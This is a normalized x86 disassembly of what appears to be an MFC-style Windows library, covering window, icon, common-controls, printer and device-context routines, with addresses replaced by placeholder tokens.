je r-xdata
xor edi edi
test eax 0x20000000
je r-xdata
add ebx esi
cmp ebx [ ebp - 0xc ]
jle r-xdata
mov esi [ ebp - 0x14 ]
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x30 ]
mov edi [ ebp - 0x20 ]
add eax ecx
sub edi [ ebp - 0x28 ]
mov ebx [ ebp - 0x1c ]
cdq
sub eax edx
sub ebx [ ebp - 0x24 ]
mov ecx eax
mov eax edi
cdq
sub eax edx
mov edx [ ebp - 0x2c ]
sar ecx 0x1
sar eax 0x1
sub ecx eax
mov eax [ ebp - 0x34 ]
add eax edx
cdq
sub eax edx
mov esi eax
mov eax ebx
cdq
sub eax edx
sar esi 0x1
sar eax 0x1
sub esi eax
cmp ecx [ ebp - 0x18 ]
jge r-xdata
lea ecx [ ebp - 0x60 ]
push ecx
push 0x1
push eax
call sub_10006e18
push eax
call sub_10006e83
mov esi [ CopyRect@IAT ]
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call esi
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call esi
jmp r-xdata
mov eax [ eax + 0x1c ]
push 0x15
push 0xffffffff
push 0xffffffff
push esi
push ecx
mov ecx [ ebp - 0x8 ]
push 0x0
call sub_10018189
pop edi
pop esi
pop ebx
leave
retn 0x4
mov esi [ ebp - 0x24 ]
sub esi [ ebp - 0x1c ]
add esi [ ebp - 0xc ]
sub_10017c10
mov eax [ esp + 0x4 ]
mov [ ecx + 0x2c ] eax
mov eax [ ecx + 0x24 ]
test al 0x10
je r-xdata
retn 0x4
and al 0xef
mov [ ecx + 0x24 ] eax
xor eax eax
push eax
push eax
push eax
push [ ecx + 0x1c ]
call [ PostMessageA@IAT ]
sub_10017c34
mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push edi
mov [ esi + 0x24 ] eax
call sub_10019774
movzx ecx [ esp + 0x14 ]
mov eax [ eax + 0xc ]
mov edi [ LoadIconA@IAT ]
push ecx
push eax
call edi
test eax eax
mov [ esi + 0x14 ] eax
jne r-xdata
push esi
call sub_10016a75
pop edi
pop esi
retn 0xc
push 0x7f00
push eax
call edi
mov [ esi + 0x14 ] eax
sub_10017c75
push ebx
push esi
mov esi r--data
push edi
push esi
call [ GetModuleHandleA@IAT ]
push esi
mov edi eax
call [ LoadLibraryA@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn 0x8
push r--data
push ebx
xor esi esi
call [ GetProcAddress@IAT ]
test eax eax
jne r-xdata
push [ esp + 0x10 ]
call eax
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov edi 0x3fc0
and eax edi
cmp eax [ esp + 0x14 ]
jne r-xdata
push ebx
call [ FreeLibrary@IAT ]
mov eax esi
mov esi [ esp + 0x14 ]
test edi edi
jne r-xdata
call [ InitCommonControls@IAT ]
mov esi edi
jmp r-xdata
call [ InitCommonControls@IAT ]
or si 0x3fc0
sub_10017cec
push ebp
mov ebp esp
sub esp 0x34
call sub_10019774
mov [ ebp - 0x4 ] eax
mov eax [ eax + 0x18 ]
not eax
and [ ebp + 0x8 ] eax
jne r-xdata
push ebx
push esi
push edi
xor edi edi
push 0x28
lea eax [ ebp - 0x34 ]
push edi
push eax
xor esi esi
call sub_10009030
mov eax [ DefWindowProcA@IAT ]
add esp 0xc
mov [ ebp - 0x30 ] eax
call sub_10019774
mov eax [ eax + 0x8 ]
push 0x8
test [ ebp + 0x8 ] 0x1
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
pop ebx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0xc ] ebx
je r-xdata
push 0x1
pop eax
jmp r-xdata
test [ ebp + 0x8 ] 0x20
je r-xdata
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x34 ] 0xb
push eax
mov [ ebp - 0x10 ] r--data
call sub_10016a75
test eax eax
je r-xdata
leave
retn 0x4
test [ ebp + 0x8 ] 0x2
je r-xdata
or [ ebp - 0x34 ] 0x8b
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_10016a75
test eax eax
je r-xdata
push 0x1
pop esi
test [ ebp + 0x8 ] 0x4
je r-xdata
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x34 ] edi
push eax
mov [ ebp - 0x10 ] r--data
mov [ ebp - 0x18 ] 0x10
call sub_10016a75
test eax eax
je r-xdata
or esi 0x20
test [ ebp + 0x8 ] bl
je r-xdata
push 0x7a01
lea eax [ ebp - 0x34 ]
push r--data
push eax
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x18 ] edi
call sub_10017c34
test eax eax
je r-xdata
or esi 0x2
test [ ebp + 0x8 ] 0x10
je r-xdata
push 0x7a02
lea eax [ ebp - 0x34 ]
push r--data
push eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x18 ] 0x6
call sub_10017c34
test eax eax
je r-xdata
or esi 0x4
test [ ebp + 0x8 ] 0x40
je r-xdata
lea eax [ ebp - 0xc ]
push 0x3fc0
push eax
mov [ ebp - 0x8 ] 0xff
call sub_10017c75
or esi eax
and [ ebp + 0x8 ] 0xc03f
or esi ebx
test [ ebp + 0x8 ] 0x80
je r-xdata
lea eax [ ebp - 0xc ]
push 0x40
push eax
mov [ ebp - 0x8 ] 0x10
call sub_10017c75
or esi eax
mov eax 0x100
test [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0xc ]
push 0x80
push eax
mov [ ebp - 0x8 ] 0x2
call sub_10017c75
or esi eax
mov eax 0x200
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_10017c75
or esi eax
mov ebx 0x400
test [ ebp + 0x8 ] ebx
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x20
call sub_10017c75
or esi eax
mov edi 0x800
test [ ebp + 0x8 ] edi
je r-xdata
lea eax [ ebp - 0xc ]
push ebx
push eax
mov [ ebp - 0x8 ] 0x1
call sub_10017c75
or esi eax
mov eax 0x1000
test [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0xc ]
push edi
push eax
mov [ ebp - 0x8 ] 0x40
call sub_10017c75
or esi eax
mov eax 0x2000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x4
call sub_10017c75
or esi eax
mov eax 0x4000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x80
call sub_10017c75
or esi eax
mov eax 0x8000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] edi
call sub_10017c75
or esi eax
mov eax 0x10000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_10017c75
or esi eax
mov eax 0x20000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x200
call sub_10017c75
or esi eax
mov ecx [ ebp - 0x4 ]
mov edx 0x3fc0
or [ ecx + 0x18 ] esi
mov eax [ ecx + 0x18 ]
mov edi eax
and edi edx
cmp edi edx
jne r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x100
call sub_10017c75
or esi eax
mov eax esi
pop edi
and eax [ ebp + 0x8 ]
pop esi
pop ebx
sub eax [ ebp + 0x8 ]
neg eax
sbb eax eax
inc eax
or al 0x10
or esi 0x10
mov [ ecx + 0x18 ] eax
sub_10017fb5
mov eax sub_1001a6a2
call sub_10008d90
push ecx
push esi
mov esi ecx
push edi
push 0xa
lea ecx [ esi + 0x4 ]
mov [ ebp - 0x10 ] esi
call sub_10014043
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0x20 ]
push 0x4
mov ecx edi
call sub_10014043
push 0x0
push 0x7
mov ecx edi
mov [ ebp - 0x4 ] 0x1
mov [ esi ] r--data
call sub_10014086
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ esi + 0x3c ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x40 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x44 ] eax
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
sub_1001801a
mov eax sub_1001a6ac
call sub_10008d90
push ecx
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
mov [ ebp - 0x10 ] esp
mov esi ecx
jne r-xdata
push edi
lea ecx [ esi + 0x4 ]
call sub_100141b7
test eax eax
jne r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
lea ecx [ esi + 0x20 ]
push edi
call sub_100141b7
test eax eax
je r-xdata
push sub_1001860f
call sub_100142f6
mov ecx [ esi + 0x3c ]
and [ ebp - 0x4 ] 0x0
mov [ ebp + 0x8 ] eax
call sub_1001515e
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx [ esi + 0x40 ]
mov [ ecx + eax ] edi
add ecx eax
cmp [ esi + 0x44 ] 0x2
jne r-xdata
push edi
lea ecx [ esi + 0x20 ]
call sub_100141ea
push [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov [ eax ] ebx
call sub_100142f6
mov eax [ esi + 0x40 ]
mov [ eax + ebx ] edi
add eax ebx
cmp [ esi + 0x44 ] 0x2
jne r-xdata
call sub_10013f97
mov [ ecx + 0x4 ] edi
jmp r-xdata
mov eax ebx
jmp r-xdata
mov [ eax + 0x4 ] edi
sub_100180d9
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
leave
retn
mov eax [ esi + 0x2c ]
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x8 ] eax
je r-xdata
lea ecx [ esi + 0x20 ]
call sub_100140cb
push edi
lea edi [ esi + 0x20 ]
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
and [ eax + 0x4 ] 0x0
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
mov ecx edi
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call sub_1001427c
mov eax [ esi + 0x40 ]
add eax [ ebp - 0x4 ]
and [ eax ] 0x0
cmp [ esi + 0x44 ] 0x2
jne r-xdata
pop edi
sub_10018189
push ebp
mov ebp esp
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
push [ ebp + 0x1c ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ edx + 0x9c ]
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ecx + 0x1c ]
call [ SetWindowPos@IAT ]
jmp r-xdata
mov eax [ eax + 0x1c ]
pop ebp
retn 0x18
sub_1001823b
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn 0x4
cmp [ esi + 0x38 ] 0x0
jne r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
push eax
mov eax [ esp + 0xc ]
lea ecx [ eax + 0x4 ]
call sub_100141b7
test eax eax
je r-xdata
mov eax [ eax + 0x34 ]
test eax eax
je r-xdata
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0x8c ]
sub_10018278
push esi
push edi
mov edi [ GetSysColor@IAT ]
mov esi ecx
push 0xf
call edi
push 0x10
mov [ esi + 0x28 ] eax
call edi
push 0x14
mov [ esi + 0x2c ] eax
call edi
push 0x12
mov [ esi + 0x30 ] eax
call edi
push 0x6
mov [ esi + 0x34 ] eax
call edi
mov edi [ GetSysColorBrush@IAT ]
push 0xf
mov [ esi + 0x38 ] eax
call edi
push 0x6
mov [ esi + 0x24 ] eax
call edi
mov [ esi + 0x20 ] eax
pop edi
pop esi
retn
sub_100182bc
push ebx
push esi
push edi
mov edi [ GetSystemMetrics@IAT ]
mov esi ecx
push 0xb
call edi
push 0xc
mov [ esi + 0x8 ] eax
call edi
cmp [ esi + 0x68 ] 0x0
mov [ esi + 0xc ] eax
je r-xdata
call sub_10019bf1
call sub_10019bc1
jmp r-xdata
push 0x0
call [ GetDC@IAT ]
mov ebx [ GetDeviceCaps@IAT ]
mov edi eax
push 0x58
push edi
call ebx
push 0x5a
push edi
mov [ esi + 0x18 ] eax
call ebx
push edi
push 0x0
mov [ esi + 0x1c ] eax
call [ ReleaseDC@IAT ]
pop edi
pop esi
pop ebx
retn
sub_10018314
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
xor edi edi
mov eax [ esi + 0x98 ]
cmp eax edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov ebx [ GlobalLock@IAT ]
push eax
call ebx
movzx ecx [ eax + 0x2 ]
push [ ebp + 0x8 ]
add ecx eax
push ecx
call [ lstrcmpA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
push edi
push eax
push [ ebp + 0x8 ]
call OpenPrinterA
test eax eax
je r-xdata
mov eax [ esi + 0x94 ]
cmp eax edi
je r-xdata
push edi
push edi
push edi
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push edi
call DocumentPropertiesA
push eax
push 0x42
call [ GlobalAlloc@IAT ]
push eax
mov [ esi + 0x94 ] eax
call ebx
push 0x2
push edi
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push edi
call DocumentPropertiesA
cmp eax 0x1
je r-xdata
push eax
call sub_100185d9
push [ ebp - 0x4 ]
call ClosePrinter
push [ esi + 0x94 ]
call sub_100185d9
mov [ esi + 0x94 ] edi
sub_100183c1
mov eax sub_1001a6f6
call sub_10008d90
push esi
call sub_1001979a
mov esi eax
cmp [ esi + 0x18 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x18 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_1001860f
call sub_100142f6
push 0x48
mov ebx eax
call sub_10014308
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x4
push r--data
call sub_10017fb5
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x18 ] eax
call sub_100142f6
pop ebx
sub_10018466
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_100183c1
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_1001423a
sub_100184a9
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
push 0xfffffff0
push [ ebp + 0x8 ]
call [ GetWindowLongA@IAT ]
and eax 0xf
cmp eax [ ebp + 0xc ]
je r-xdata
leave
retn 0x8
lea eax [ ebp - 0xc ]
push 0xa
push eax
push [ ebp + 0x8 ]
call [ GetClassNameA@IAT ]
lea eax [ ebp - 0xc ]
push r--data
push eax
call [ lstrcmpiA@IAT ]
neg eax
sbb eax eax
inc eax
sub_100184f3
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp + 0xc ]
push edi
push eax
push [ ebp + 0x8 ]
call [ ClientToScreen@IAT ]
mov edi [ GetWindow@IAT ]
push 0x5
push [ ebp + 0x8 ]
xor eax eax
push esi
call [ GetDlgCtrlID@IAT ]
cmp ax 0xffff
je r-xdata
push 0x2
push esi
jmp r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax __dos_header
je r-xdata
call edi
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call [ GetWindowRect@IAT ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push eax
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
pop edi
pop esi
leave
retn 0xc
sub_10018568
push ebp
mov ebp esp
sub esp 0x100
push esi
push [ ebp + 0xc ]
call [ lstrlenA@IAT ]
mov esi eax
mov eax 0x100
cmp esi eax
ja r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ SetWindowTextA@IAT ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowTextA@IAT ]
cmp eax esi
jne r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x100 ]
push eax
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
pop esi
leave
retn 0x8
sub_100185d9
push edi
mov edi [ esp + 0x8 ]
test edi edi
je r-xdata
pop edi
retn 0x4
push edi
call [ GlobalFlags@IAT ]
and eax 0xff
mov ecx eax
dec eax
test ecx ecx
je r-xdata
push edi
call [ GlobalFree@IAT ]
push esi
lea esi [ eax + 0x1 ]
push edi
call [ GlobalUnlock@IAT ]
dec esi
jne r-xdata
pop esi
sub_1001860f
push esi
call sub_10019542
mov esi eax
test esi esi
je r-xdata
call sub_10013f97
xor eax eax
pop esi
retn
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_1000a6bc
pop ecx
mov ecx [ esp + 0x8 ]
lea edx [ ecx + 0x4 ]
cmp eax edx
ja r-xdata
sub eax ecx
sub eax 0x4
push eax
push [ esi + 0xc ]
call sub_1000a78c
pop ecx
pop ecx
push [ esi + 0xc ]
call sub_10008d46
and [ esi + 0xc ] 0x0
pop ecx
jmp r-xdata
push 0x1
pop eax
pop esi
retn
sub_10018691
mov eax sub_1001a732
call sub_10008d90
push esi
call sub_1001979a
mov esi eax
cmp [ esi + 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x1c ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_1001860f
call sub_100142f6
push 0x48
mov ebx eax
call sub_10014308
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x2
push 0x4
push r--data
call sub_10017fb5
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x1c ] eax
call sub_100142f6
pop ebx
sub_10018718
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x14 ]
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_10018691
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_1001423a
sub_10018749
mov eax sub_1001a744
call sub_10008d90
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ ecx + 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_10018718
push eax
call [ DeleteDC@IAT ]
sub_1001879d
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov edi [ SaveDC@IAT ]
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
push eax
call edi
mov ebx eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
push eax
call edi
test eax eax
je r-xdata
or ebx 0xffffffff
sub_100187ce
push esi
mov esi ecx
push edi
mov edi [ RestoreDC@IAT ]
mov ecx [ esi + 0x4 ]
push 0x1
cmp ecx [ esi + 0x8 ]
pop eax
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
test eax eax
je r-xdata
xor eax eax
push [ esp + 0xc ]
push esi
call edi
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
sub_1001880c
push ebx
push esi
push edi
mov esi ecx
push [ esp + 0x10 ]
call [ GetStockObject@IAT ]
mov ecx [ esi + 0x4 ]
mov edi [ SelectObject@IAT ]
mov ebx eax
xor eax eax
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push ebx
push ecx
call edi
push eax
call sub_10018b7c
pop edi
pop esi
pop ebx
retn 0x4
push ebx
push esi
call edi
sub_10018848
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
xor eax eax
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SelectObject@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
push eax
call sub_10018b7c
pop edi
pop esi
pop ebx
retn 0x4
test ebx ebx
jne r-xdata
push eax
push ecx
call edi
mov eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
xor eax eax
jmp r-xdata
push eax
push esi
call edi
sub_1001888e
push esi
mov esi ecx
or eax 0xffffffff
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetBkColor@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_100188bd
push esi
mov esi ecx
or eax 0xffffffff
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetTextColor@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_100188ec
push esi
mov esi ecx
xor eax eax
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetMapMode@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_1001891a
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ SetViewportOrgEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_10018966
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ OffsetViewportOrgEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_100189b2
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ SetViewportExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_100189fe
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ ScaleViewportExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x14
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_10018a56
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ SetWindowExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_10018aa2
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ ScaleWindowExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x14
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_10018b0a
mov eax sub_1001a75a
call sub_10008d90
push esi
call sub_1001979a
mov esi eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x20 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_1001860f
call sub_100142f6
push 0x48
mov ebx eax
call sub_10014308
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x4
push r--data
call sub_10017fb5
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x20 ] eax
call sub_100142f6
pop ebx
sub_10018b91
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_10018b0a
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_1001423a
sub_10018bd1
push esi
call sub_10006cd6
mov esi eax
test esi esi
je r-xdata
pop esi
retn 0x4
mov eax [ esi ]
mov ecx esi
call [ eax + 0xb0 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x68 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push [ esp + 0x8 ]
call [ eax + 0x64 ]
sub_10018bff
push ebp
mov ebp esp
sub esp 0x114
push ebx
push esi
push edi
xor ebx ebx
mov edi ecx
push ebx
mov [ ebp - 0x10 ] edi
call sub_10018bd1
lea eax [ ebp - 0x4 ]
push eax
push ebx
call sub_10018d77
xor esi esi
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
cmp edi ebx
je r-xdata
push ebx
push ebx
push 0x376
push [ ebp - 0x4 ]
call [ SendMessageA@IAT ]
cmp eax ebx
je r-xdata
cmp esi ebx
mov [ ebp - 0x8 ] ebx
je r-xdata
lea esi [ edi + 0x9c ]
mov esi eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
test bl 0xf0
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
test edi edi
je r-xdata
